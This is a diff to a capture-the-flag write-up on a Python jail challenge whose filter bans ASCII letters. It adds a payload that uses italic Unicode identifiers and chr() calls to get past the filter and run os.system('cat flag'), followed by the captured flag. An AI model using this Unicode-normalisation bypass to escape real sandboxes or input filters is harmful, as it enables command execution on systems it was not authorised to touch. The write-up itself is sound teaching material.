@@ -248,9 +248,17 @@ So these means we need to acess our jail but we are not allowed to use any lette
 
 We can easily convert import and system to italic ([online](https://lingojam.com/ItalicTextGenerator) or using word):
 >__𝘪𝘮𝘱𝘰𝘳𝘵__('𝘰𝘴').𝘴𝘺𝘴𝘵𝘦𝘮('𝘤𝘢𝘵 𝘧𝘭𝘢𝘨')
-The proble is doing italic for 'os' or 'cat flag' will not work as they are inside the string. A good workaround this is just to use chr in italic and write the strings as ASCII:
->__𝘪𝘮𝘱𝘰𝘳𝘵__('𝘰𝘴').𝘴𝘺𝘴𝘵𝘦𝘮('𝘤𝘢𝘵 𝘧𝘭𝘢𝘨')
 
+The problem is doing italic for 'os' or 'cat flag' will not work as they are inside the string. A good workaround this is just to use chr in italic and write the strings as ASCII:
+
+>__𝘪𝘮𝘱𝘰𝘳𝘵__(𝘤𝘩𝘳(111)+𝘤𝘩𝘳(115)).𝘴𝘺𝘴𝘵𝘦𝘮(𝘤𝘩𝘳(99)+𝘤𝘩𝘳(97)+𝘤𝘩𝘳(116)+𝘤𝘩𝘳(32)+𝘤𝘩𝘳(102)+𝘤𝘩𝘳(108)+𝘤𝘩𝘳(97)+𝘤𝘩𝘳(103))
+
+Connect to the given ip and send our payload:
+>uiuctf{unicode_normalization_is_not_normal_d2f674}
+
+This challenge was great because we can clearly learn about all these amazing ways to trick filtering systems!
+
+### **baby_python (133 Points)**
 
 
 
